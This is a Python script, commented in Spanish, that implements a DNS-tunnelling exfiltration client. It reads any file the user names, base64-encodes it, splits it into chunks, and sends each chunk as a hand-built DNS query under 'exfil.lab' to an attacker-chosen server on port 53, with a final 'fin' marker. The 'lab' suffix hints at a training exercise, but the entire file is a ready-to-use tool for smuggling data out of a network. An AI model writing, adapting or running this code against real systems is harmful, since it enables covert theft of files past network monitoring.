import socket
import base64
import os
import signal
import sys
import time
import math

# Intentar usar colorama para colores en Windows/term
try:
    from colorama import init as colorama_init, Fore, Style
    colorama_init()
except Exception:
    class _F:
        RESET = ""
        RED = ""
        GREEN = ""
        YELLOW = ""
        CYAN = ""
        MAGENTA = ""
        BLUE = ""
    Fore = _F()
    Style = _F()

def def_handler(sig, frame):
    print("\n\n" + Fore.YELLOW + "[*] Saliendo..." + Style.RESET_ALL)
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# ---------------- CONFIGURACIÓN ----------------
SERVER_PORT = 53
CHUNK_SIZE = 45
SUFIJO_DOMINIO = "exfil.lab"
# ----------------------------------------------

def human_size(n):
    # convierte bytes a formato legible
    if n < 1024:
        return f"{n} B"
    for unit in ("KB", "MB", "GB", "TB"):
        n /= 1024.0
        if n < 1024.0:
            return f"{n:.2f} {unit}"
    return f"{n:.2f} PB"

def color_input(prompt_text):
    """Imprime el prompt en azul y deja la respuesta en blanco."""
    print(Fore.BLUE + prompt_text + Style.RESET_ALL, end="")
    return input("")

def chunk_data(data, size):
    return [data[i:i + size] for i in range(0, len(data), size)]

def build_dns_query(domain):
    ID = b'\x12\x34'
    FLAGS = b'\x01\x00'
    QDCOUNT = b'\x00\x01'
    header = ID + FLAGS + QDCOUNT + b'\x00\x00' * 3

    qname = b''.join(len(p).to_bytes(1, 'big') + p.encode() for p in domain.split('.')) + b'\x00'
    QTYPE = b'\x00\x01'
    QCLASS = b'\x00\x01'
    return header + qname + QTYPE + QCLASS

def print_progress(sent, total, start, last_domain=None, error=None):
    pct = (sent / total) * 100 if total else 100
    bar_len = 30
    filled = int(bar_len * sent / total) if total else bar_len
    bar = "[" + "#" * filled + "-" * (bar_len - filled) + "]"
    elapsed = time.time() - start
    rate = sent / elapsed if elapsed > 0 else 0
    eta = (total - sent) / rate if rate > 0 else float('inf')
    eta_str = f"{int(eta)}s" if math.isfinite(eta) else "--"

    domain_display = (last_domain[:60] + "...") if last_domain and len(last_domain) > 63 else (last_domain or "")
    line = (
        f"{Fore.CYAN}{bar}{Style.RESET_ALL} "
        f"{Fore.GREEN}{sent}/{total}{Style.RESET_ALL} "
        f"{pct:6.2f}% "
        f"rate:{rate:.2f} cps "
        f"elapsed:{int(elapsed)}s eta:{eta_str} "
    )
    if domain_display:
        line += f"last: {Fore.MAGENTA}{domain_display}{Style.RESET_ALL}"
    if error:
        line += " " + Fore.RED + f"ERROR: {error}" + Style.RESET_ALL

    # Use carriage return to overwrite
    sys.stdout.write("\r" + line.ljust(150))
    sys.stdout.flush()

def enviar_archivo():
    SERVER_IP = color_input("Introduce la IP del servidor: ").strip()
    FILENAME = color_input("Introduce la ruta completa del archivo: ").strip()

    if not SERVER_IP:
        print(Fore.RED + "[X] Debes introducir una IP válida." + Style.RESET_ALL)
        return

    if not os.path.exists(FILENAME):
        print(Fore.RED + f"[X] Archivo no encontrado: {FILENAME}" + Style.RESET_ALL)
        return

    with open(FILENAME, "rb") as f:
        raw_data = f.read()

    total_bytes = len(raw_data)
    print("\n" + Fore.BLUE + "=== Resumen antes de enviar ===" + Style.RESET_ALL)
    print(f" Servidor: {Fore.YELLOW}{SERVER_IP}:{SERVER_PORT}{Style.RESET_ALL}")
    print(f" Archivo : {Fore.YELLOW}{FILENAME}{Style.RESET_ALL} ({human_size(total_bytes)})")

    encoded = base64.urlsafe_b64encode(raw_data).decode().rstrip("=")
    total_chars = len(encoded)
    chunks = chunk_data(encoded, CHUNK_SIZE)
    total_chunks = len(chunks)

    print(f" Tamaño codificado: {Fore.YELLOW}{total_chars}{Style.RESET_ALL} caracteres")
    print(f" CHUNK_SIZE = {CHUNK_SIZE} => {Fore.YELLOW}{total_chunks}{Style.RESET_ALL} chunks a enviar")
    print(Fore.BLUE + "===============================\n" + Style.RESET_ALL)

    # Confirmar
    proceed = input("¿Proceder con el envío? [y/N]: ").strip().lower()
    if proceed != 'y':
        print(Fore.YELLOW + "Operación cancelada por el usuario." + Style.RESET_ALL)
        return

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    enviados = 0
    start = time.time()
    last_err = None

    for i, chunk in enumerate(chunks):
        domain = f"{chunk}.{i}.{SUFIJO_DOMINIO}"

        # Validar longitud de etiquetas DNS
        if any(len(label) > 63 for label in domain.split(".")):
            last_err = f"Chunk {i} demasiado largo, ignorado."
            print_progress(enviados, total_chunks, start, last_domain=domain, error=last_err)
            time.sleep(0.01)
            continue

        query = build_dns_query(domain)
        try:
            sock.sendto(query, (SERVER_IP, SERVER_PORT))
            enviados += 1
            last_err = None
        except Exception as e:
            last_err = str(e)

        # Actualizar barra
        print_progress(enviados, total_chunks, start, last_domain=domain, error=last_err)
        time.sleep(0.01)  # pequeño pulso para que se vea la barra en terminales rápidos

    # enviar paquete final
    fin_query = build_dns_query(f"fin.{SUFIJO_DOMINIO}")
    try:
        sock.sendto(fin_query, (SERVER_IP, SERVER_PORT))
    except Exception:
        pass

    # mover cursor y mostrar resumen final
    sys.stdout.write("\n")
    elapsed = time.time() - start
    print(Fore.GREEN + "\n[✓] Envío finalizado" + Style.RESET_ALL)
    print(f"  Chunks planeados : {total_chunks}")
    print(f"  Chunks enviados  : {enviados}")
    print(f"  Tiempo total     : {int(elapsed)} s")
    print(f"  Velocidad media  : {enviados / elapsed:.2f} chunks/s" if elapsed > 0 else "  Velocidad media  : --")
    print(f"  Sufijo dominio   : {SUFIJO_DOMINIO}")
    sock.close()

if __name__ == "__main__":
    enviar_archivo()
